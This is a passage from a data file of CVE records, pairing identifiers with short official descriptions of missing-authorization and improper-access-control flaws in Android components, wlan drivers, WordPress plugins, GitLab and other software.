attacker with no additional execution privileges needed. User interaction is not needed for exploitation. Patch ID: A20210008; Issue ID: OSBNB00123241."}, {"Reference": "CVE-2022-0163", "Description": "The Smart Forms WordPress plugin before 2.6.71 does not have authorisation in its rednao_smart_forms_entries_list AJAX action, allowing any authenticated users, such as subscriber, to download arbitrary form's data, which could include sensitive information such as PII depending on the form."}, {"Reference": "CVE-2022-0179", "Description": "snipe-it is vulnerable to Missing Authorization"}, {"Reference": "CVE-2022-0755", "Description": "Missing Authorization in GitHub repository salesagility/suitecrm prior to 7.12.5."}, {"Reference": "CVE-2022-1054", "Description": "The RSVP and Event Management Plugin WordPress plugin before 2.7.8 does not have any authorisation checks when exporting its entries, and has the export function hooked to the init action. As a result, unauthenticated attackers could call it and retrieve PII such as first name, last name and email address of user registered for events"}, {"Reference": "CVE-2022-20002", "Description": "In incfs, there is a possible way of mounting on arbitrary paths due to a missing permission check. This could lead to local escalation of privilege with System execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-12LAndroid ID: A-198657657"}, {"Reference": "CVE-2022-20049", "Description": "In vpu, there is a possible escalation of privilege due to a missing permission check. This could lead to local escalation of privilege with System execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS05954679; Issue ID: ALPS05954679."}, {"Reference": "CVE-2022-20053", "Description": "In ims service, there is a possible escalation of privilege due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS06219097; Issue ID: ALPS06219097."}, {"Reference": "CVE-2022-20126", "Description": "In setScanMode of AdapterService.java, there is a possible way to enable Bluetooth discovery mode without user interaction due to a missing permission check. This could lead to local escalation of privilege with User execution privileges needed. User interaction is needed for exploitation.Product: AndroidVersions: Android-10 Android-11 Android-12 Android-12LAndroid ID: A-203431023"}, {"Reference": "CVE-2022-20133", "Description": "In setDiscoverableTimeout of AdapterService.java, there is a possible bypass of user interaction due to a missing permission check. This could lead to local escalation of privilege with User execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-10 Android-11 Android-12 Android-12LAndroid ID: A-206807679"}, {"Reference": "CVE-2022-20137", "Description": "In onCreateContextMenu of NetworkProviderSettings.java, there is a possible way for non-owner users to change WiFi settings due to a missing permission check. This could lead to local escalation of privilege with User execution privileges needed. User interaction is needed for exploitation.Product: AndroidVersions: Android-12 Android-12LAndroid ID: A-206986392"}, {"Reference": "CVE-2022-20138", "Description": "In ACTION_MANAGED_PROFILE_PROVISIONED of DevicePolicyManagerService.java, there is a possible way for unprivileged app to send MANAGED_PROFILE_PROVISIONED intent due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-10 Android-11 Android-12 Android-12LAndroid ID: A-210469972"}, {"Reference": "CVE-2022-20172", "Description": "In onbind of ShannonRcsService.java, there is a possible access to protect data due to a missing permission check. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android kernelAndroid ID: A-206987222References: N/A"}, {"Reference": "CVE-2022-20182", "Description": "In handle_ramdump of pixel_loader.c, there is a possible way to create a ramdump of non-secure memory due to a missing permission check. This could lead to local information disclosure with System execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android kernelAndroid ID: A-222348453References: N/A"}, {"Reference": "CVE-2022-20200", "Description": "In updateApState of SoftApManager.java, there is a possible leak of hotspot state due to a missing permission check. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-12LAndroid ID: A-212695058"}, {"Reference": "CVE-2022-20204", "Description": "In registerRemoteBugreportReceivers of DevicePolicyManagerService.java, there is a possible reporting of falsified bug reports due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-12LAndroid ID: A-171495100"}, {"Reference": "CVE-2022-20206", "Description": "In setPackageOrComponentEnabled of NotificationManagerService.java, there is a missing permission check. This could lead to local information disclosure about enabled notification listeners with User execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-12LAndroid ID: A-220737634"}, {"Reference": "CVE-2022-20240", "Description": "In sOpAllowSystemRestrictionBypass of AppOpsManager.java, there is a possible leak of location information due to a missing permission check. This could lead to local escalation of privilege with System execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-12 Android-12LAndroid ID: A-231496105"}, {"Reference": "CVE-2022-20255", "Description": "In SettingsProvider, there is a possible way to read or change the default ringtone due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-222687217"}, {"Reference": "CVE-2022-20259", "Description": "In Telephony, there is a possible leak of ICCID and EID due to a missing permission check. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-221431393"}, {"Reference": "CVE-2022-20261", "Description": "In LocationManager, there is a possible way to get location information due to a missing permission check. This could lead to local information disclosure with System execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-219835125"}, {"Reference": "CVE-2022-20262", "Description": "In ActivityManager, there is a possible way to check another process's capabilities due to a missing permission check. This could lead to local information disclosure with User execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-218338453"}, {"Reference": "CVE-2022-20263", "Description": "In ActivityManager, there is a way to read process state for other users due to a missing permission check. This could lead to local information disclosure of app usage with User execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-217935264"}, {"Reference": "CVE-2022-20267", "Description": "In bluetooth, there is a possible way to enable or disable bluetooth connection without user consent due to a missing permission check. This could lead to local escalation of privilege with User execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-211646835"}, {"Reference": "CVE-2022-20274", "Description": "In Keyguard, there is a missing permission check. This could lead to local escalation of privilege and prevention of screen timeout with User execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-206470146"}, {"Reference": "CVE-2022-20281", "Description": "In Core, there is a possible way to start an activity from the background due to a missing permission check. This could lead to local escalation of privilege with User execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-204083967"}, {"Reference": "CVE-2022-20282", "Description": "In AppWidget, there is a possible way to start an activity from the background due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-204083104"}, {"Reference": "CVE-2022-20284", "Description": "In Telephony, there is a possible information disclosure due to a missing permission check. This could lead to local information disclosure of phone accounts with User execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-231986341"}, {"Reference": "CVE-2022-20294", "Description": "In Content, there is a possible way to learn about an account present on the device due to a missing permission check. This could lead to local information disclosure with User execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-202160705"}, {"Reference": "CVE-2022-20295", "Description": "In ContentService, there is a possible way to check if an account exists on the device due to a missing permission check. This could lead to local information disclosure with User execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-202160584"}, {"Reference": "CVE-2022-20296", "Description": "In ContentService, there is a possible way to check if an account exists on the device due to a missing permission check. This could lead to local information disclosure with User execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-201794303"}, {"Reference": "CVE-2022-20298", "Description": "In ContentService, there is a possible way to check if an account exists on the device due to a missing permission check. This could lead to local information disclosure with User execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-201416182"}, {"Reference": "CVE-2022-20299", "Description": "In ContentService, there is a possible way to check if the given account exists on the device due to a missing permission check. This could lead to local information disclosure with User execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-201415895"}, {"Reference": "CVE-2022-20300", "Description": "In Content, there is a possible way to check if the given account exists on the device due to a missing permission check. This could lead to local information disclosure with User execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-200956588"}, {"Reference": "CVE-2022-20301", "Description": "In Content, there is a possible way to check if an account exists on the device due to a missing permission check. This could lead to local information disclosure with User execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-200956614"}, {"Reference": "CVE-2022-20303", "Description": "In ContentService, there is a possible way to determine if an account is on the device without GET_ACCOUNTS permission due to a missing permission check. This could lead to local information disclosure with User execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-200573021"}, {"Reference": "CVE-2022-20305", "Description": "In ContentService, there is a possible disclosure of available account types due to a missing permission check. This could lead to local information disclosure with User execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-199751623"}, {"Reference": "CVE-2022-20310", "Description": "In Telecomm, there is a possible disclosure of registered self managed phone accounts due to a missing permission check. This could lead to local information disclosure with User execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-192663798"}, {"Reference": "CVE-2022-20311", "Description": "In Telecomm, there is a possible disclosure of registered self managed phone accounts due to a missing permission check. This could lead to local information disclosure with User execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-192663553"}, {"Reference": "CVE-2022-20312", "Description": "In WifiP2pManager, there is a possible toobtain WiFi P2P MAC address without user consent due to missing permission check. This could lead to local information disclosure without additional execution privileges needed. User interaction is not needed forexploitationProduct: AndroidVersions: Android-13Android ID: A-192244925"}, {"Reference": "CVE-2022-20315", "Description": "In ActivityManager, there is a possible disclosure of installed packages due to a missing permission check. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-191058227"}, {"Reference": "CVE-2022-20321", "Description": "In Settings, there is a possible way for an application without permissions to read content of WiFi QR codes due to a missing permission check. This could lead to local information disclosure with no additional execution privileges needed. User interaction is needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-187176859"}, {"Reference": "CVE-2022-20322", "Description": "In PackageManager, there is a possible installed package disclosure due to a missing permission check. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-187176993"}, {"Reference": "CVE-2022-20323", "Description": "In PackageManager, there is a possible package installation disclosure due to a missing permission check. This could lead to local information disclosure with User execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-187176203"}, {"Reference": "CVE-2022-20326", "Description": "In Telephony, there is a possible disclosure of SIM identifiers due to a missing permission check. This could lead to local information disclosure with User execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-185235527"}, {"Reference": "CVE-2022-20327", "Description": "In Wi-Fi, there is a possible way to retrieve the WiFi SSID without location permissions due to a missing permission check. This could lead to local information disclosure with User execution privileges needed. User interaction is needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-185126813"}, {"Reference": "CVE-2022-20328", "Description": "In PackageManager, there is a possible way to determine whether an app is installed due to a missing permission check. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-184948501"}, {"Reference": "CVE-2022-20329", "Description": "In Wifi, there is a possible way to enable Wifi without permissions due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-183410556"}, {"Reference": "CVE-2022-20330", "Description": "In Bluetooth, there is a possible way to connect or disconnect bluetooth devices without user awareness due to a missing permission check. This could lead to local escalation of privilege with User execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-181962588"}, {"Reference": "CVE-2022-20341", "Description": "In ConnectivityService, there is a possible bypass of network permissions due to a missing permission check. This could lead to local information disclosure of tethering interfaces with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-162952629"}, {"Reference": "CVE-2022-20348", "Description": "In updateState of LocationServicesWifiScanningPreferenceController.java, there is a possible admin restriction bypass due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-10 Android-11 Android-12 Android-12LAndroid ID: A-228315529"}, {"Reference": "CVE-2022-20349", "Description": "In WifiScanningPreferenceController and BluetoothScanningPreferenceController, there is a possible admin restriction bypass due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-10 Android-11 Android-12 Android-12LAndroid ID: A-228315522"}, {"Reference": "CVE-2022-20352", "Description": "In addProviderRequestListener of LocationManagerService.java, there is a possible way to learn which packages request location information due to a missing permission check. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-12 Android-12LAndroid ID: A-222473855"}, {"Reference": "CVE-2022-20358", "Description": "In startSync of AbstractThreadedSyncAdapter.java, there is a possible way to access protected content of content providers due to a missing permission check. This could lead to local information disclosure with User execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-10 Android-11 Android-12 Android-12LAndroid ID: A-203229608"}, {"Reference": "CVE-2022-20360", "Description": "In setChecked of SecureNfcPreferenceController.java, there is a missing permission check. This could lead to local escalation of privilege from the guest user with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-10 Android-11 Android-12 Android-12LAndroid ID: A-228314987"}, {"Reference": "CVE-2022-20394", "Description": "In getInputMethodWindowVisibleHeight of InputMethodManagerService.java, there is a possible way to determine when another app is showing an IME due to a missing permission check. This could lead to local information disclosure with no additional execution privileges needed. User interaction is needed for exploitation.Product: AndroidVersions: Android-10 Android-11 Android-12 Android-12LAndroid ID: A-204906124"}, {"Reference": "CVE-2022-20511", "Description": "In getNearbyAppStreamingPolicy of DevicePolicyManagerService.java, there is a missing permission check. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-235821829"}, {"Reference": "CVE-2022-20547", "Description": "In multiple functions of AdapterService.java, there is a possible way to manipulate Bluetooth state due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-240301753"}, {"Reference": "CVE-2022-20572", "Description": "In verity_target of dm-verity-target.c, there is a possible way to modify read-only files due to a missing permission check. This could lead to local escalation of privilege with System execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android kernelAndroid ID: A-234475629References: Upstream kernel"}, {"Reference": "CVE-2022-21748", "Description": "In telephony, there is a possible information disclosure due to a missing permission check. This could lead to local information disclosure with User execution privileges needed. User interaction is needed for exploitation. Patch ID: ALPS06511030; Issue ID: ALPS06511030."}, {"Reference": "CVE-2022-21749", "Description": "In telephony, there is a possible information disclosure due to a missing permission check. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS06511058; Issue ID: ALPS06511058."}, {"Reference": "CVE-2022-2379", "Description": "The Easy Student Results WordPress plugin through 2.2.8 lacks authorisation in its REST API, allowing unauthenticated users to retrieve information related to the courses, exams, departments as well as student's grades and PII such as email address, physical address, phone number etc"}, {"Reference": "CVE-2022-26429", "Description": "In cta, there is a possible way to write permission usage records of an app due to a missing permission check. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation. Patch ID: ALPS07025415; Issue ID: ALPS07025415."}, {"Reference": "CVE-2022-27211", "Description": "A missing permission check in Jenkins Kubernetes Continuous Deploy Plugin 2.3.1 and earlier allows attackers with Overall/Read permission to connect to an attacker-specified SSH server using attacker-specified credentials IDs obtained through another method, capturing credentials stored in Jenkins."}, {"Reference": "CVE-2022-32768", "Description": "Multiple authentication bypass vulnerabilities exist in the objects id handling functionality of WWBN AVideo 11.6 and dev master commit 3f7c0364. A specially-crafted HTTP request by an authenticated user can lead to unauthorized access and takeover of resources. An attacker can send an HTTP request to trigger this vulnerability.This vulnerability exists in the Live Schedules plugin, allowing an attacker to bypass authentication by guessing a sequential ID, allowing them to take over the another user's streams."}, {"Reference": "CVE-2022-32769", "Description": "Multiple authentication bypass vulnerabilities exist in the objects id handling functionality of WWBN AVideo 11.6 and dev master commit 3f7c0364. A specially-crafted HTTP request by an authenticated user can lead to unauthorized access and takeover of resources. An attacker can send an HTTP request to trigger this vulnerability.This vulnerability exists in the Playlists plugin, allowing an attacker to bypass authentication by guessing a sequential ID, allowing them to take over the another user's playlists."}, {"Reference": "CVE-2022-3482", "Description": "An improper access control issue in GitLab CE/EE affecting all versions from 11.3 prior to 15.3.5, 15.4 prior to 15.4.4, and 15.5 prior to 15.5.2 allowed an unauthorized user to see release names even when releases we set to be restricted to project members only"}, {"Reference": "CVE-2022-36856", "Description": "Improper access control vulnerability in Telecom application prior to SMR Sep-2022 Release 1 allows attacker to start emergency calls via undefined permission."}, {"Reference": "CVE-2022-39081", "Description": "In network service, there is a missing permission check. This could lead to local escalation of privilege with System execution privileges needed."}, {"Reference": "CVE-2022-39082", "Description": "In network service, there is a missing permission check. This could lead to local escalation of privilege with System execution privileges needed."}, {"Reference": "CVE-2022-39083", "Description": "In network service, there is a missing permission check. This could lead to local escalation of privilege with System execution privileges needed."}, {"Reference": "CVE-2022-39084", "Description": "In network service, there is a missing permission check. This could lead to local escalation of privilege with System execution privileges needed."}, {"Reference": "CVE-2022-39085", "Description": "In network service, there is a missing permission check. This could lead to local escalation of privilege with System execution privileges needed."}, {"Reference": "CVE-2022-39086", "Description": "In network service, there is a missing permission check. This could lead to local escalation of privilege with System execution privileges needed."}, {"Reference": "CVE-2022-39087", "Description": "In network service, there is a missing permission check. This could lead to local escalation of privilege with System execution privileges needed."}, {"Reference": "CVE-2022-39088", "Description": "In network service, there is a missing permission check. This could lead to local escalation of privilege with System execution privileges needed."}, {"Reference": "CVE-2022-39811", "Description": "Italtel NetMatch-S CI 5.2.0-20211008 has incorrect Access Control under NMSCI-WebGui/advancedsettings.jsp and NMSCIWebGui/SaveFileUploader. By not verifying permissions for access to resources, it allows an attacker to view pages that are not allowed, and modify the system configuration, bypassing all controls (without checking for user identity)."}, {"Reference": "CVE-2022-42766", "Description": "In wlan driver, there is a possible missing permission check, This could lead to local information disclosure."}, {"Reference": "CVE-2022-42782", "Description": "In wlan driver, there is a possible missing permission check, This could lead to local information disclosure."}, {"Reference": "CVE-2022-44421", "Description": "In wlan driver, there is a possible missing permission check. This could lead to local In wlan driver, information disclosure."}, {"Reference": "CVE-2022-47324", "Description": "In wlan driver, there is a possible missing permission check. This could lead to local information disclosure."}, {"Reference": "CVE-2022-47325", "Description": "In wlan driver, there is a possible missing permission check. This could lead to local information disclosure."}, {"Reference": "CVE-2022-47326", "Description": "In wlan driver, there is a possible missing permission check. This could lead to local information disclosure."}, {"Reference": "CVE-2022-47327", "Description": "In wlan driver, there is a possible missing permission check. This could lead to local information disclosure."}, {"Reference": "CVE-2022-47328", "Description": "In wlan driver, there is a possible missing permission check. This could lead to local information disclosure."}, {"Reference": "CVE-2022-47329", "Description": "In wlan driver, there is a possible missing permission check. This could lead to local information disclosure."}, {"Reference": "CVE-2022-47330", "Description": "In wlan driver, there is a possible missing permission check. This could lead to local information disclosure."}, {"Reference": "CVE-2022-47332", "Description": "In wlan driver, there is a possible missing permission check. This could lead to local information disclosure."}, {"Reference": "CVE-2022-47333", "Description": "In wlan driver, there is a possible missing permission check. This could lead to local information disclosure."}, {"Reference": "CVE-2022-47357", "Description": "In log service, there is a missing permission check. This could lead to local denial of service in log service."}, {"Reference": "CVE-2022-47367", "Description": "In bluetooth driver, there is a missing permission check. This could lead to local information disclosure with no additional execution privileges needed."}, {"Reference": "CVE-2022-47450", "Description": "In wlan driver, there is a possible missing permission check. This could lead to local information disclosure."}, {"Reference": "CVE-2022-1066", "Description": "Aethon TUG Home Base Server versions prior to version 24 are affected by un unauthenticated attacker who can freely access hashed user credentials."}, {"Reference": "CVE-2022-1070", "Description": "Aethon TUG Home Base Server versions prior to version 24 are affected by un unauthenticated attacker who can freely access hashed user credentials."}, {"Reference": "CVE-2022-20941", "Description": "A vulnerability in the web-based management interface of Cisco Firepower Management Center (FMC) Software could allow an unauthenticated, remote attacker to access sensitive information. This vulnerability is due to missing authorization for certain resources in the web-based management interface together with insufficient entropy in these resource names. An attacker could exploit this vulnerability by sending a series of HTTPS requests to an affected device to enumerate resources on the device. A successful exploit could allow the attacker to retrieve sensitive information from the device."}, {"Reference": "CVE-2022-26423", "Description": "Aethon TUG Home Base Server versions prior to version 24 are affected by un unauthenticated attacker who can freely access hashed user credentials."}, {"Reference": "CVE-2022-36091", "Description": "XWiki Platform Web Templates are templates for XWiki Platform, a generic wiki platform. Through the suggestion feature, string and list properties of objects the user shouldn't have access to can be accessed in versions prior to 13.10.4 and 14.2. This includes private personal information like email addresses and salted password hashes of registered users but also other information stored in properties of objects. Sensitive configuration fields like passwords for LDAP or SMTP servers could be accessed. By exploiting an additional vulnerability, this issue can even be exploited on private wikis at least for string properties. The issue is patched in version 13.10.4 and 14.2. Password properties are no longer displayed and rights are checked for other properties. A workaround is available. The template file `suggest.vm` can be replaced by a patched version without upgrading or restarting XWiki unless it has been overridden, in which case the overridden template should be patched, too. This might need adjustments for older versions, though."}, {"Reference": "CVE-2021-21978", "Description": "VMware View Planner 4.x prior to 4.6 Security Patch 1 contains a remote code execution vulnerability. Improper input validation and lack of authorization leading to arbitrary file upload in logupload web application. An unauthorized attacker with network access to View Planner Harness could upload and execute a specially crafted file leading to remote code execution within the logupload container."}, {"Reference": "CVE-2021-25519", "Description": "An improper access control vulnerability in CPLC prior to SMR Dec-2021 Release 1 allows local attackers to access CPLC information without permission."}, {"Reference": "CVE-2022-0203", "Description": "Improper Access Control in GitHub repository crater-invoice/crater prior to 6.0.2."}, {"Reference": "CVE-2022-0726", "Description": "Missing Authorization in GitHub repository chocobozzz/peertube prior to 4.1.0."}, {"Reference": "CVE-2022-0756", "Description": "Missing Authorization in GitHub repository salesagility/suitecrm prior to 7.12.5."}, {"Reference": "CVE-2022-0871", "Description": "Missing Authorization in GitHub repository gogs/gogs prior to 0.12.5."}, {"Reference": "CVE-2022-0905", "Description": "Missing Authorization in GitHub repository go-gitea/gitea prior to 1.16.4."}, {"Reference": "CVE-2022-0932", "Description": "Missing Authorization in GitHub repository saleor/saleor prior to 3.1.2."}, {"Reference": "CVE-2022-1442", "Description": "The Metform WordPress plugin is vulnerable to sensitive information disclosure due to improper access control in the ~/core/forms/action.php file which can be exploited by an unauthenticated attacker to view all API keys and secrets of integrated third-party APIs like that of PayPal, Stripe, Mailchimp, Hubspot, HelpScout, reCAPTCHA and many more, in versions up to and including 2.1.3."}, {"Reference": "CVE-2022-1511", "Description": "Missing Authorization in GitHub repository snipe/snipe-it prior to 5.4.4."}, {"Reference": "CVE-2022-20004", "Description": "In checkSlicePermission of SliceManagerService.java, it is possible to access any slice URI due to improper input validation. This could lead to local escalation of privilege with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-10 Android-11 Android-12 Android-12LAndroid ID: A-179699767"}, {"Reference": "CVE-2022-24768", "Description": "Argo CD is a declarative, GitOps continuous delivery tool for Kubernetes. All unpatched versions of Argo CD starting with 1.0.0 are vulnerable to an improper access control bug, allowing a malicious user to potentially escalate their privileges to admin-level. Versions starting with 0.8.0 and 0.5.0 contain limited versions of this issue. To perform exploits, an authorized Argo CD user must have push access to an Application's source git or Helm repository or `sync` and `override` access to an Application. Once a user has that access, different exploitation levels are possible depending on their other RBAC privileges. A patch for this vulnerability has been released in Argo CD versions 2.3.2, 2.2.8, and 2.1.14. Some mitigation measures are available but do not serve as a substitute for upgrading. To avoid privilege escalation, limit who has push access to Application source repositories or `sync` + `override` access to Applications; and limit which repositories are available in projects where users have `update` access to Applications. To avoid unauthorized resource inspection/tampering, limit who has `delete`, `get`, or `action` access to Applications."}, {"Reference": "CVE-2022-28866", "Description": "Multiple Improper Access Control was discovered in Nokia AirFrame BMC Web GUI < R18 Firmware v4.13.00. It does not properly validate requests for access to (or editing of) data and functionality in all endpoints under /#settings/* and /api/settings/*. By not verifying the permissions for access to resources, it allows a potential attacker to view pages, with sensitive data, that are not allowed, and modify system configurations also causing DoS, which should be accessed only by user with administration profile, bypassing all controls (without checking for user identity)."}, {"Reference": "CVE-2022-4366", "Description": "Missing Authorization in GitHub repository lirantal/daloradius prior to master branch."}, {"Reference": "CVE-2022-44009", "Description": "Improper access control in Key-Value RBAC in StackStorm version 3.7.0 didn't check the permissions in Jinja filters, allowing attackers to access K/V pairs of other users, potentially leading to the exposure of sensitive Information."}, {"Reference": "CVE-2022-0390", "Description": "Improper access control in Gitlab CE/EE versions 12.7 to 14.5.4, 14.6 to 14.6.4, and 14.7 to 14.7.1 allowed for project non-members to retrieve issue details when it was linked to an item from the vulnerability dashboard."}, {"Reference": "CVE-2022-1423", "Description": "Improper access control in the CI/CD cache mechanism in GitLab CE/EE affecting all versions starting from 1.0.2 before 14.8.6, all versions from 14.9.0 before 14.9.4, and all versions from 14.10.0 before 14.10.1 allows a malicious actor with Developer privileges to perform cache poisoning leading to arbitrary code execution in protected branches"}, {"Reference": "CVE-2022-0125", "Description": "An issue has been discovered in GitLab affecting all versions starting from 12.0 before 14.4.5, all versions starting from 14.5.0 before 14.5.3, all versions starting from 14.6.0 before 14.6.2. GitLab was not verifying that a maintainer of a project had the right access to import members from a target project."}, {"Reference": "CVE-2022-0579", "Description": "Missing Authorization in Packagist snipe/snipe-it prior to 5.3.9. "}, {"Reference": "CVE-2022-0611", "Description": "Missing Authorization in Packagist snipe/snipe-it prior to 5.3.11. "}, {"Reference": "CVE-2022-38512", "Description": "The Translation module in Liferay Portal v7.4.3.12 through v7.4.3.36, and Liferay DXP 7.4 update 8 through 36 does not check permissions before allowing a user to export a web content for translation, allowing attackers to download a web content page's XLIFF translation file via crafted URL."}, {"Reference": "CVE-2022-0178", "Description": "Missing Authorization vulnerability in snipe snipe/snipe-it.This issue affects snipe/snipe-i before 5.3.8. "}, {"Reference": "CVE-2022-3082", "Description": "The miniOrange Discord Integration WordPress plugin before 2.1.6 does not have authorisation and CSRF in some of its AJAX actions, allowing any logged in users, such as subscriber to call them, and disable the app for example"}, {"Reference": "CVE-2022-3923", "Description": "The ActiveCampaign for WooCommerce WordPress plugin before 1.9.8 does not have authorisation check when cleaning up its error logs via an AJAX action, which could allow any authenticated users, such as subscriber to call it and remove error logs."}, {"Reference": "CVE-2022-21718", "Description": "Electron is a framework for writing cross-platform desktop applications using JavaScript, HTML and CSS. A vulnerability in versions prior to `17.0.0-alpha.6`, `16.0.6`, `15.3.5`, `14.2.4`, and `13.6.6` allows renderers to obtain access to a bluetooth device via the web bluetooth API if the app has not configured a custom `select-bluetooth-device` event handler. This has been patched and Electron versions `17.0.0-alpha.6`, `16.0.6`, `15.3.5`, `14.2.4`, and `13.6.6` contain the fix. Code from the GitHub Security Advisory can be added to the app to work around the issue."}, {"Reference": "CVE-2022-40316", "Description": "The H5P activity attempts report did not filter by groups, which in separate groups mode could reveal information to non-editing teachers about attempts/users in groups they should not have access to."}, {"Reference": "CVE-2022-2732", "Description": "Missing Authorization in GitHub repository openemr/openemr prior to 7.0.0.1. "}, {"Reference": "CVE-2022-1323", "Description": "The Discy WordPress theme before 5.0 lacks authorization checks then processing ajax requests to the discy_update_options action, allowing any logged in users (with privileges as low as Subscriber,) to change Theme options by sending a crafted POST request."}, {"Reference": "CVE-2021-0978", "Description": "In getSerialForPackage of DeviceIdentifiersPolicyService.java, there is a possible way to determine whether an app is installed, without query permissions, due to side channel information disclosure. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-12Android ID: A-192587406"}, {"Reference": "CVE-2021-0986", "Description": "In hasGrantedPolicy of DevicePolicyManagerService.java, there is a possible information disclosure about the device owner, profile owner, or device admin due to a logic error in the code. This could lead to local information disclosure with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-12Android ID: A-192247339"}, {"Reference": "CVE-2021-1037", "Description": "The broadcast that DevicePickerFragment sends when a new device is paired doesn't have any permission checks, so any app can register to listen for it. This lets apps keep track of what devices are paired without requesting BLUETOOTH permissions.Product: AndroidVersions: Android-10 Android-11 Android-12 Android-9Android ID: A-162951906"}, {"Reference": "CVE-2022-20529", "Description": "In multiple locations of WifiDialogActivity.java, there is a possible limited lockscreen bypass due to a logic error in the code. This could lead to local escalation of privilege in wifi settings with no additional execution privileges needed. User interaction is not needed for exploitation.Product: AndroidVersions: Android-13Android ID: A-231583603"}, {"Reference": "CVE-2022-36226", "Description": "SiteServerCMS 5.X has a Remote-download-Getshell-vulnerability via /SiteServer/Ajax/ajaxOtherService.aspx."}, {"Reference": "CVE-2022-2370", "Description": "The YaySMTP WordPress plugin before 2.2.1 does not have capability check before displaying the Mailer Credentials in JS code for the settings, allowing any authenticated users, such as subscriber to retrieve them"}, {"Reference": "CVE-2022-30746", "Description": "Missing caller check in Smart Things prior to version 1.7.85.12 allows attacker to access senstive information remotely using javascript interface API."}, {"Reference": "CVE-2022-0492", "Description": "A vulnerability was found in the Linux kernel\u2019s cgroup_release_agent_write in the kernel/cgroup/cgroup-v1.c function. This flaw, under certain circumstances, allows the use of the cgroups v1 release_agent feature to escalate privileges and bypass the namespace isolation unexpectedly."}, {"Reference": "CVE-2022-2552", "Description": "The Duplicator WordPress plugin before 1.4.7 does not authenticate or authorize visitors before displaying information about the system such as server software, php version and full file system path to the site."}, {"Reference": "CVE-2022-32560", "Description": "An issue was discovered in Couchbase Server before 7.0.4. XDCR lacks role checking when changing internal settings."}, {"Reference": "CVE-2021-26637", "Description": "There is no account authentication and permission check logic in the firmware and existing apps of SiHAS's 